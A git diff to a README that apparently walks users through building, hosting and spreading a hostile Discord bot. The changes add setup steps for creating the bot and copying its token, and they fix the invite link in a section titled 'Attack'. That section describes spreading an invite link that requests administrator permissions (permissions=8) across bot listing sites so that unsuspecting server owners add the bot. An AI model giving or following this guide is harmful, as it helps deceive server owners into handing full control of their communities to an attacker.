@@ -21,6 +21,12 @@ Also edit the bot icon with the same icon
 
 ![image](https://user-images.githubusercontent.com/71982379/194365146-10462608-0f5f-4df7-882b-d7dde5de0701.png)
 
+Go to BOT and click add bot
+
+![image](https://user-images.githubusercontent.com/71982379/194718303-b617fd5b-fdd2-415e-8372-a611d256cdf4.png)
+
+And copy the token
+
 # 🔥 Step3 - The bot generation
 Download our
 
@@ -43,6 +49,7 @@ Finnally, on Overview, active the dyno
 
 ![image](https://user-images.githubusercontent.com/71982379/194374538-68af269b-809c-4e89-a1d9-afa37905d2b4.png)
 
+
 Return to **Deploy** and click DEPLOY
 
 # 🔥 Step5 - Attack
@@ -50,5 +57,4 @@ The attack is resumed to send the invite link, add it to many Discord bot browse
 
 **To get your bot id:** ![image](https://user-images.githubusercontent.com/71982379/194377709-83e51eb1-4dee-4ec7-888a-421f308322d7.png)
 
-
-**The link:** `https://discord.com/api/oauth2/authorize?client_id= {your bot id} &permissions=8&scope=bot%20applications.commands`
+**The link:** `https://discord.com/api/oauth2/authorize?client_id={your bot id}&permissions=8&scope=bot%20applications.commands`
